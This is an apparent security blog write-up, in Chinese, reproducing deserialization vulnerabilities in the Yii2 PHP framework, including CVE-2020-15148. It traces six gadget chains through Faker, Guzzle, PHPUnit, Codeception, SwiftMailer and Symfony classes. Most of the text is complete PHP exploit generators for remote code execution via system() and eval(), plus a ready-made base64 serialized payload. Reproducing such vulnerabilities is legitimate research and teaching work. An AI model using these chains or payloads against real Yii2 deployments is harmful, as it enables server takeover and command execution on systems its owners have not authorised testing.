## yii2框架 反序列化漏洞复现

###  yii 框架

Yii 是一个适用于开发 Web2.0 应用程序的高性能PHP 框架。

Yii 是一个通用的 Web 编程框架，即可以用于开发各种用 PHP 构建的 Web 应用。 因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。

Yii 当前有两个主要版本：1.1 和 2.0。 1.1 版是上代的老版本，现在处于维护状态。 2.0 版是一个完全重写的版本，采用了最新的技术和协议，包括依赖包管理器 Composer、PHP 代码规范 PSR、命名空间、Traits（特质）等等。 2.0 版代表新一代框架，是未来几年中我们的主要开发版本。

###  搭建过程

直接官网下载2.0.37，放在phpstudy,修改config/web.php文件里cookieValidationKey的值,这个值没有固定，然后打开目录`http://ip/yii2/web`

由于是反序列化利用链，我们需要一个入口点，在controllers目录下创建一个Controller:

路由为：`http://ip/index.php?r=test/test`

controllers/TestController.php

```php
<?php

namespace app\controllers;

use yii\web\Controller;

class TestController extends Controller{
    public function actionTest($data){
        return unserialize(base64_decode($data));
    }
}

```

### CVE-2020-15148复现

在`phpstorm`直接利用`F4`一键跟进

首先看`\yii\vendor\yiisoft\yii2\db\BatchQueryResult.php`

![image-20220329151422036](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291514250.png)

跟踪`close`函数，但是后面不能利用了。

![image-20220329151529948](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291515051.png)

因为`$this->_dataReader`参数可控，想到了`__call`,当对象调用不可访问的函数时，就会触发。

全局搜索一下__call方法，在`\vendor\fzaninotto\faker\src\Faker\Generator.php`存在合适的方法

![image-20220329152500434](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291525507.png)

![image-20220329152602227](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291526360.png)



跟踪`format`函数

```php
public function format($formatter, $arguments = array())
    {
        return call_user_func_array($this->getFormatter($formatter), $arguments);
    }

```

call_user_func_array:调用回调函数，并把一个数组参数作为回调函数的参数

```php
call_user_func_array(callable $callback, array $param_arr): mixed 
callback
    被调用的回调函数。
param_arr
    要被传入回调函数的数组，这个数组得是索引数组。

```

跟进getFormatter，其中$formatter=close

```php
public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);

                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }

```

因为`$this->formatters`是可控的，因此getFormatter方法的返回值也是我们可控的，因此`call_user_func_array($this->getFormatter($formatter), $arguments);`中，第一个参数可控，第二个参数为空。

所以我们需要找一个无参数的方法

```
function \w+\(\) ?\n?\{(.*\n)+call_user_func
```

`rest/CreateAction.php以及rest/IndexAction.php`

主要是它的run方法

```php
public function run()
{
    if ($this->checkAccess) {
        call_user_func($this->checkAccess, $this->id);
    }
    
    return $model;
}
```

所以pop链

```php
class BatchQueryResult  ->__destruct()
↓↓↓
class BatchQueryResult  ->reset() //调用close函数导致触发__call
↓↓↓
class Generator  ->__call()
↓↓↓
class Generator  ->format()
↓↓↓
class Generator  ->getFormatter() //call_user_func_array,找无参方法
↓↓↓
class IndexAction  ->run()
```

所以直接构造

`poc1`

`use`用来调用某个包的类

```php
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'phpinfo';
            $this->id = '1';				//命令执行
        }
    }
}
namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];
        }
    }
}
namespace yii\db{

    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader=new Generator();
        }
    }
}
namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}

```

![image-20220329154128574](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291541661.png)



###  链子2

yii2.0.37

我们利用`close`函数

找到一个`FnStream.php`在`vendor\guzzlehttp\psr7\src`目录下，代码如下

![image-20220329155835216](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291558308.png)



`$this->_fn_close`属性可控

我们构造链子

```php
<?php
namespace GuzzleHttp\Psr7 {
    class FnStream {
        var $_fn_close = "phpinfo()";
    }
}
namespace yii\db {
    use GuzzleHttp\Psr7\FnStream;
    class BatchQueryResult {
        private $_dataReader;
        public function __construct() {
            $this->_dataReader  = new FnStream();
        }
    }
	$b=new BatchQueryResult();
	echo base64_encode(serialize($b));
```

![image-20220329160359965](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291604058.png)



我们将危害进行放大，这里就需要一个执行类，拿这个`call_user_func`函数作跳板，来进行代码执行，全局搜索eval，找到一个`MockTrait.php`文件在`vendor\phpunit\phpunit\src\Framework\MockObject`下，代码如下：

```php
public function generate(): string
{
    if (!\class_exists($this->mockName, false)) {
        eval($this->classCode);
    }

    return $this->mockName;
}
```

`$this->classCode`和`$this->mockName`都可控

于是即可构造完整的`pop`链

```php
yii\db\BatchQueryResult::__destruct()->reset()->close()
->
GuzzleHttp\Psr7\FnStream::close()->call_user_func
->
PHPUnit\Framework\MockObject\MockTrait::generate->eval()
```

所以构造链子

```php
<?php
namespace PHPUnit\Framework\MockObject{
    class MockTrait {
        private $classCode = "system('whoami')";
        private $mockName = "z3eyond";
    }
}

namespace GuzzleHttp\Psr7 {

    use PHPUnit\Framework\MockObject\MockTrait;
    class FnStream {
        var $_fn_close;
        function __construct(){
            $this->_fn_close = array(
                new MockTrait(),
                'generate'
            );
        }
    }
}
namespace yii\db {
    use GuzzleHttp\Psr7\FnStream;
    class BatchQueryResult {
        private $_dataReader;
        public function __construct() {
            $this->_dataReader  = new FnStream();
        }
    }
    $b = new BatchQueryResult();
    print_r(base64_encode(serialize($b))).PHP_EOL;

}
```

![image-20220329170035862](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291700956.png)

报错，我们查`LogicException`

![image-20220329170134240](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291701351.png)



只需要绕过`__wakeup`就行，增加属性个数就行

所以payload

```
TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoyOntzOjk6Il9mbl9jbG9zZSI7YToyOntpOjA7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQiOjI6e3M6NDk6IgBQSFBVbml0XEZyYW1ld29ya1xNb2NrT2JqZWN0XE1vY2tUcmFpdABjbGFzc0NvZGUiO3M6MTc6InN5c3RlbSgnd2hvYW1pJyk7IjtzOjQ4OiIAUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQAbW9ja05hbWUiO3M6ODoiZXh0cmFkZXIiO31pOjE7czo4OiJnZW5lcmF0ZSI7fX19
```

![image-20220329170533196](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291705282.png)

###  链子3

yii2.0.38

利用点在`vendor/codeception/codeception/ext/RunProcess.php`

![image-20220329170953317](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203291709531.png)

对象在销毁的时候，触发`__destruct`方法，`__destruct`方法调用了`stopProcess`方法，`stopProcess`方法中的`$this->processes`可控，即`$process`也可控，`$process`会调用`isRunning()`方法，那么这里就可以尝试利用`__call`方法了，可以接着上面的`POP1`链利用

所以pop链的流程

```php
\Codeception\Extension\RunProcess::__destruct()->stopProcess()->$process->isRunning()
->
Faker\Generator::__call()->format()->call_user_func_array()
->
\yii\rest\IndexAction::run->call_user_func()
```

POP3:

```php
<?php
// EXP3: RunProcess -> ... -> __call()
namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls -al';           //command
            // run() -> call_user_func($this->checkAccess, $this->id);
        }
    }
}

namespace Faker{
    use yii\rest\IndexAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['isRunning'] = [new IndexAction, 'run'];
            //stopProcess方法里又调用了isRunning()方法: $process->isRunning()
        }
    }
}


namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this->processes = [new Generator()];
        }

    }
}

namespace{
    use Codeception\Extension\RunProcess;
    echo base64_encode(serialize(new RunProcess()));
}

?>
```

###  链子4

利用点在`vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php`中



主要代码

```php
public function __destruct()
{
    foreach ($this->keys as $nsKey => $null) {
        $this->clearAll($nsKey);
    }
}
public function clearAll($nsKey)
{
    if (array_key_exists($nsKey, $this->keys)) {
        foreach ($this->keys[$nsKey] as $itemKey => $null) {
            $this->clearKey($nsKey, $itemKey);
        }
        if (is_dir($this->path.'/'.$nsKey)) {
            rmdir($this->path.'/'.$nsKey);
        }
        unset($this->keys[$nsKey]);
    }
}
public function clearKey($nsKey, $itemKey)
{
    if ($this->hasKey($nsKey, $itemKey)) {
        $this->freeHandle($nsKey, $itemKey);
        unlink($this->path.'/'.$nsKey.'/'.$itemKey);
    }
}
```

`unlink`使用拼接字符串，`$this->path`可控，即可想到调用`__toString`方法（当一个对象被当做字符串使用时被调用）

全局查找`__toString()`方法

下面的几个类中的`__toString`方法可用

```php
\Codeception\Util\XmlBuilder::__toString -> \DOMDocument::saveXML 可以触发__call方法

\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -> render 可以触发__call方法

\phpDocumentor\Reflection\DocBlock\Tags\Deprecated::__toString -> render 可以触发__call方法

\phpDocumentor\Reflection\DocBlock\Tags\Generic::__toString -> render 可以触发__call方法

\phpDocumentor\Reflection\DocBlock\Tags\See::__toString -> render可以触发__call方法

\phpDocumentor\Reflection\DocBlock\Tags\Link::__toString -> render

```

以`\Codeception\Util\XmlBuilder::__toString`为例，构造pop链

```php
\Swift_KeyCache_DiskKeyCache::__destruct -> clearAll -> clearKey -> __toString
-> 
\Codeception\Util\XmlBuilder::__toString -> saveXML
-> 
Faker\Generator::__call()->format() -> call_user_func_array()
->
\yii\rest\IndexAction::run -> call_user_func()
```

pop4:

```php
<?php
// EXP: Swift_KeyCache_DiskKeyCache::__destruct -> __toString -> __call
namespace {

    use Codeception\Util\XmlBuilder;
    use phpDocumentor\Reflection\DocBlock\Tags\Covers;

    class Swift_KeyCache_DiskKeyCache{
        private $path;
        private $keys;

        public function __construct()
        {
            $this->keys = array(
                "extrader" =>array("is", "am")
            );  //注意 ClearAll中的数组解析了两次，之后再unlink
            $this->path = new XmlBuilder();
        }
    }

    $payload = new Swift_KeyCache_DiskKeyCache();
    echo base64_encode(serialize($payload));
}

namespace Codeception\Util{
    use Faker\Generator;

    class XmlBuilder{
        protected $__dom__;
        public function __construct(){
            $this->__dom__ = new Generator();
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Faker\Generator;

    class Covers{
        private $refers;
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
            $this->refers = "AnyStringisOK";
        }
    }

}

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'whoami';           //command
            // run() -> call_user_func($this->checkAccess, $this->id);
        }
    }
}

namespace Faker{
    use yii\rest\IndexAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['saveXML'] = [new IndexAction, 'run'];
        }
    }
}
```

###  链子5

过程

```php
\Codeception\Extension\RunProcess::__destruct()->stopProcess()->$process->isRunning()
->
Faker\ValidGenerator::__call()->call_user_func_array()->call_user_func()
->
Faker\DefaultGenerator::__call()->$this->default
```



```php
<?php

namespace Faker;
class DefaultGenerator{
    protected $default ;
    function __construct($argv)
    {
        $this->default = $argv;
    }
}

class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    function __construct($command,$argv)
    {
        $this->generator = new DefaultGenerator($argv);
        $this->validator = $command;
        $this->maxRetries = 99999999;
    }
}

namespace Codeception\Extension;
use Faker\ValidGenerator;
class RunProcess{
    private $processes = [];
    function __construct($command,$argv)
    {
        $this->processes[] = new ValidGenerator($command,$argv);
    }
}

$exp = new RunProcess('system','whoami');
echo(base64_encode(serialize($exp)));
```



###  链子6

```php
\Codeception\Extension\RunProcess::__destruct()->stopProcess()->$process->isRunning()
->
Faker\UniqueGenerator::__call()->call_user_func_array()->serialize()
->
Symfony\Component\String::__sleep()::__toString()::($this->value)()
```



```php
<?php

namespace yii\rest
{
    class IndexAction{
        function __construct()
        {
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}

namespace Symfony\Component\String
{
    use yii\rest\IndexAction;
    class LazyString
    {
        function __construct()
        {
            $this->value = [new indexAction(), "run"];
        }
    } 
    class UnicodeString
    {
        function __construct()
        {
            $this->value = new LazyString();
        }
    }
}

namespace Faker
{
    use Symfony\Component\String\LazyString;
    class DefaultGenerator
    {
        function __construct()
        {
            $this->default = new LazyString();
        }
    }

    class UniqueGenerator
    {
        function __construct()
        {
            $this->generator = new DefaultGenerator();
            $this->maxRetries = 99999999;
        }

    }
}

namespace Codeception\Extension
{
    use Faker\UniqueGenerator;
    class RunProcess
    {
        function __construct()
        {
            $this->processes[] = new UniqueGenerator();
        }
    }
}

namespace
{
    use Codeception\Extension\RunProcess;
    $exp = new RunProcess();
    echo(base64_encode(serialize($exp)));
}
```





## 参考链接

https://www.extrader.top/posts/c79847ee/
